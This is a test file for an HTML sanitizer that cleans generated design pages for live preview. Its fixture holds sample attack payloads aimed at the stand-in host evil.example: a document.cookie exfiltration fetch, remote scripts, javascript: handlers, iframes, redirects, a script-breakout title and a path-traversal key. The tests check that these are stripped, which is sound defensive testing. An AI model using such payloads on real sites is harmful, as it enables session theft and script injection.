import { describe, expect, it } from "vitest";
import { liveNames, stitchLiveFiles, stitchLiveHtml, LIVE_CSP } from "./stitch-live.js";

const screens = [
  { id: "S-1", route: "/", title: "Desk book", headings: ["Today"] },
  { id: "S-2", route: "/patients", title: "Patients" },
  { id: "S-3", route: "/patients/:id/visits", title: "Visit history" },
];
const page = `<!doctype html><html><head><base href="https://evil.example/"><meta http-equiv="refresh" content="0;url=https://evil.example">
<script src="https://cdn.tailwindcss.com?plugins=forms"></script><script>tailwind.config = { theme: { extend: {} } }</script>
<script src="https://evil.example/x.js"></script><script>fetch("https://evil.example/" + document.cookie)</script></head>
<body onload="steal()"><nav><a href="javascript:steal()" onclick="steal()">Patients</a><a href="https://evil.example">Out</a></nav>
<iframe src="https://evil.example"></iframe><img src="data:image/png;base64,AAAA"><img src="data:text/html,<script>1</script>"><form action="javascript:steal()"><button>Save</button></form></body></html>`;

describe("a live Stitch page", () => {
  it("keeps Tailwind and its settings and drops everything else that runs or loads a document", () => {
    const html = stitchLiveHtml(page, "S-1", screens);
    expect(html).toContain('src="https://cdn.tailwindcss.com?plugins=forms"');
    expect(html).toContain("tailwind.config = {");
    for (const gone of ["evil.example/x.js", "document.cookie", "onload", "onclick", "javascript:", "<iframe", "<base", "refresh", "data:text/html"]) expect(html).not.toContain(gone);
    expect(html).toContain('src="data:image/png;base64,AAAA"');
    expect(html).toContain(`<meta http-equiv="Content-Security-Policy" content="${LIVE_CSP}">`);
    expect(html.indexOf("Content-Security-Policy")).toBeLessThan(html.indexOf("cdn.tailwindcss.com?"));
  });

  it("a script that only looks like Tailwind's settings is dropped", () => {
    const html = stitchLiveHtml(`<html><head><script>tailwind.config = {}; fetch("https://evil.example")</script><script src="https://cdn.tailwindcss.com.evil.example/x.js"></script></head><body></body></html>`, "S-1", screens);
    expect(html).not.toContain("evil.example");
  });

  it("its links open the demo's other screens by name, never its own, and nothing closes the script early", () => {
    expect(liveNames(screens[0]!)).toEqual(["desk book", "today", "home", "dashboard", "overview"]);
    expect(liveNames(screens[2]!)).toEqual(["visit history", "visits", "patients visits"]);
    const html = stitchLiveHtml(page, "S-1", [...screens, { id: "S-4", route: "/x", title: "</script><script>steal()" }]);
    const script = html.slice(html.lastIndexOf("<script>"));
    expect(script).toContain('"id":"S-2","names":["patients"]');
    expect(script).not.toContain('"id":"S-1"');
    expect(script).toContain("parent.postMessage({factoryGo:id}");
    expect(script).not.toContain("</script><script>steal");
  });

  it("one file per frame of a Stitch design, none for another engine or a frame whose HTML is gone", () => {
    const design = { engine: "stitch", screens: screens.map((s) => ({ id: s.id, route: s.route, facts: { title: s.title } })), stitch: { frames: { "ST-1": { screen: "S-1", html: "a" }, "ST-2": { screen: "S-2", html: "gone" }, "../x": { screen: "S-3", html: "a" } } } };
    const get = (sha: string) => { if (sha === "gone") throw new Error("missing"); return Buffer.from(page); };
    const files = stitchLiveFiles(design, get);
    expect(files.map((f) => f.path)).toEqual(["stitch/ST-1.html"]);
    expect(files[0]!.content).toContain("Content-Security-Policy");
    expect(stitchLiveFiles({ ...design, engine: "claude" }, get)).toEqual([]);
  });
});
